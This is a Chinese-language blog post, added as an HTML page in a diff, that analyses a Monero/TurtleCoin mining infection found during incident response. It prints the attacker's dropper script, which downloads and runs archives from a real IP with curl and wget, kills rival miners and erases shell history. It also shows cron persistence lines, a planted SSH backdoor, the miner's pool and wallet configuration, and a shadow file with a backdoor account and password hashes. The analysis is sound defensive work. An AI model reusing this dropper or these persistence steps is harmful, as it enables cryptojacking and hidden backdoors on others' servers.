@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>XMR门罗币挖矿应急 ~ Misaki&#39;s Blog</title>
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    
+<link rel="stylesheet" href="/css/main.css">
+
+    
+        
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
+        
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-envelope"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://raw.githubusercontent.com/MisakiKata/misakikata.github.io/master/img/wxmini.png" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-comments"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">XMR门罗币挖矿应急</h1>
+        <p class="text-center"><b>Tuesday, February 8th 2022, 4:39 pm</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <pre class="line-numbers language-none"><code class="language-none">curl -O 2.58.149.237:6972&#x2F;hoze<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202081637259.png" alt="image-20220117135255528"></p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202081637261.png" alt="image-20220117135335865"></p>
+<p>文件内容为：</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
+cores&#x3D;$(nproc)
+temp&#x3D;$(cat &#x2F;proc&#x2F;meminfo | grep MemAvailable | awk  &#39;&#123;print$2&#125;&#39;)
+ram&#x3D;$(expr $temp &#x2F; 1000)
+echo $cores
+echo $ram
+#ram&#x3D;10
+rm -rf hoze
+rm -rf &#x2F;var&#x2F;tmp&#x2F;hoze
+[[ ! $(uname -a) &#x3D;~ &quot;x86_64&quot; ]] &amp;&amp; exit
+#####################################
+function SlowAndSteady &#123;
+cd &#x2F;var&#x2F;tmp ; curl -O 2.58.149.237:6972&#x2F;xri3.tar || cd1 -O 2.58.149.237:6972&#x2F;xri3.tar || wget 2.58.149.237:6972&#x2F;xri3.tar &amp;&amp; tar -xvf xri3.tar &amp;&amp; mv xri3 .xri &amp;&amp; rm -rf xri3.tar &amp;&amp; cd .xri ; chmod +x * ; .&#x2F;init0 ; history -c ; rm -rf ~&#x2F;.bash_history
+​
+&#125;
+​
+function MoneyFactory &#123;
+cd &#x2F;var&#x2F;tmp ; curl -O 2.58.149.237:6972&#x2F;xrx2.tar || cd1 -O 2.58.149.237:6972&#x2F;xrx2.tar || wget 2.58.149.237:6972&#x2F;xrx2.tar &amp;&amp; tar -xvf xrx2.tar &amp;&amp; mv xrx2 .xrx &amp;&amp; rm -rf xrx.tar &amp;&amp; cd .xrx ; chmod +x * ; .&#x2F;init0 ; history -c ; rm -rf ~&#x2F;.bash_history
+​
+&#125;
+#####################################
+rm -rf &#x2F;var&#x2F;tmp&#x2F;.xri
+rm -rf &#x2F;var&#x2F;tmp&#x2F;.xrx
+rm -rf &#x2F;var&#x2F;tmp&#x2F;.x
+pkill -9 xri
+pkill -9 xrx
+pkill -STOP xmrig
+pkill -STOP Opera
+rm -rf ~&#x2F;Opera
+​
+#####################################
+if [ &quot;$EUID&quot; &#x3D; 0 ]; then
+    chmod 755 &#x2F;usr&#x2F;bin&#x2F;chattr &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1
+    chattr -ia &#x2F;etc&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1
+    rm -rf &#x2F;etc&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1
+    chattr -R -ia &#x2F;var&#x2F;spool&#x2F;cron &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1
+    chattr -ia &#x2F;etc&#x2F;crontab &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1
+    chattr -R -ia &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1
+    chattr -R -ia &#x2F;etc&#x2F;cron.d &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1
+fi
+chattr -ia &#x2F;tmp&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1
+rm -rf &#x2F;tmp&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1
+echo &quot;crontab info:&quot;
+crontab -l
+crontab -r &gt; &#x2F;dev&#x2F;null
+chattr -ia &#x2F;etc&#x2F;zzh &gt; &#x2F;dev&#x2F;null
+chattr -ia &#x2F;tmp&#x2F;zzh &gt; &#x2F;dev&#x2F;null
+rm -rf &#x2F;etc&#x2F;zzh &gt; &#x2F;dev&#x2F;null
+rm -rf &#x2F;tmp&#x2F;zzh &gt; &#x2F;dev&#x2F;null
+pkill -f &quot;zzh&quot; &gt; &#x2F;dev&#x2F;null
+chattr -ia &#x2F;tmp&#x2F;.ice-unix &gt; &#x2F;dev&#x2F;null
+rm -rf &#x2F;tmp&#x2F;.ice-unix &gt; &#x2F;dev&#x2F;null
+chattr -ia &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pnscan &gt; &#x2F;dev&#x2F;null
+rm -rf &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pnscan &gt; &#x2F;dev&#x2F;null
+pkill -f &quot;pnscan&quot; &gt; &#x2F;dev&#x2F;null
+mv &#x2F;bin&#x2F;top.original &#x2F;bin&#x2F;top
+#####################################
+if (( $cores &lt; 4 )) || (( $ram &lt; 2300 )) ; then
+    echo &quot;installing trtl miner&quot;
+    SlowAndSteady
+elif (( $cores &gt;&#x3D; 4 )) &amp;&amp; (( $ram &gt;&#x3D; 2300 )) ; then
+        echo &quot;installing xmr miner&quot;
+    SlowAndSteady
+fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>前几步是用来判断系统的内存和进程限制，但对后面的运行实际没有区别，非x86架构则直接退出运行。中间有个下载文件，是一个二进制文件，下载下来查看一下。</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -O 2.58.149.237:6972&#x2F;xri3.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202081637262.png" alt="image-20220117144846484"></p>
+<p>后门先进行进程的清理，然后在root下修改定时任务文件，删除了一个shell文件<code>/etc/newinit.sh</code>，我去查了一下这个文件，发现也是一个挖矿的定时程序，原来是先把别的程序给他删了，再去执行自己的。同时修改文件的属性，便于更改。后续还删除了<code>pnscan</code>，这个是针对reids的挖矿病毒，会修改top文件为top.original，这里也贴心的帮你修改过来了。</p>
+<p>原pnscan病毒会修改top为：<code>echo &quot;top.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;&gt;&gt;/bin/top</code></p>
+<p>只是它还会修改ps命令，这里没有修改回来，看来还不够贴心。</p>
+<p>不管你系统是多少内存啥的，反正都给你运行函数<code>SlowAndSteady</code>。会解压在/var/tmp目录下，更改名称为.xri。执行目录下的<code>chmod +x * ; ./init0</code>，同时给你删除掉命令记录，同时删除下载的压缩包。</p>
+<p>从文件内看到一个key文件，里面是ssh的公钥，说明保留采用公钥的方式登陆的后门。</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>会在/etc/crontab里写入定时任务</p>
+<pre class="line-numbers language-none"><code class="language-none">@weekly root &#x2F;var&#x2F;tmp&#x2F;.x&#x2F;secure
+@reboot root &#x2F;var&#x2F;tmp&#x2F;.x&#x2F;secure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>config里配置了门罗币的地址</p>
+<pre class="line-numbers language-none"><code class="language-none">&quot;url&quot;: &quot;5.9.157.2:10380&quot;,
+            &quot;user&quot;: &quot;TRTLv1M57YFZjutXRds3cNd6iRurtebcy6HxQ6hRMCzGF5nE4sWuqCCX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKTze3C&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: &quot;pooled&quot;,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>执行的程序为/var/tmp/.xri下的xri文件，后续还会在/var/tmp/.x下把scp和secure拷贝进来，上面的定时任务也是针对这个secure文件。</p>
+<p>程序还会在创建一个cheeki的普通用户，密码写在shadow文件内，看起来是跟root一个密码。但是这个密码是修改过，也就是root的密码修改为其他密码了。</p>
+<pre class="line-numbers language-none"><code class="language-none">root:$6$u3a2aCKC$TULEOlBwPWBIAYZkG0NNNbWM.9tRozeHUO2HyRvlTQpekaOQ2E3S5E5&#x2F;gqyOnVAtaF8G41oZS0KRioLw7PfzT1:19011:0:99999:7:::
+bin:*:18353:0:99999:7:::
+daemon:*:18353:0:99999:7:::
+adm:*:18353:0:99999:7:::
+lp:*:18353:0:99999:7:::
+sync:*:18353:0:99999:7:::
+shutdown:*:18353:0:99999:7:::
+halt:*:18353:0:99999:7:::
+mail:*:18353:0:99999:7:::
+operator:*:18353:0:99999:7:::
+games:*:18353:0:99999:7:::
+ftp:*:18353:0:99999:7:::
+nobody:*:18353:0:99999:7:::
+systemd-network:!!:19011::::::
+dbus:!!:19011::::::
+polkitd:!!:19011::::::
+sshd:!!:19011::::::
+postfix:!!:19011::::::
+chrony:!!:19011::::::
+cheeki:$6$u3a2aCKC$TULEOlBwPWBIAYZkG0NNNbWM.9tRozeHUO2HyRvlTQpekaOQ2E3S5E5&#x2F;gqyOnVAtaF8G41oZS0KRioLw7PfzT1:19011:0:99999:7:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>scp文件从作用上看，是负责进程维护和修改定时任务的</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
+while true; do &#x2F;var&#x2F;tmp&#x2F;.x&#x2F;secure ; sleep 10; done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>从进程中scp启动后，xri才会出现，也就是xri至少是secure产生的，init.sh里面倒是写明白了启动xri并且使用diswon后台维护。整个流程中secure是关键运行文件。</p>
+<p>因此需要查看被爆破的用户是哪个，去除密钥和用户，删除定时任务和进程。重启之前记得修改root密码。</p>
+
+          </div>
+          <br><br>
+              
+                <div class="license-wrapper">
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2022/02/XMR%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/">https://misakikata.github.io/2022/02/XMR%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2022/02/XMR%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/">February 8th 2022, 4:39:02 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2022/02/XMR%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/">February 8th 2022, 4:39:02 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;shell</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = 'https://misakikata.github.io/2022/02/XMR门罗币挖矿应急/'; 
+            this.page.identifier = '/2022/02/XMR门罗币挖矿应急/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
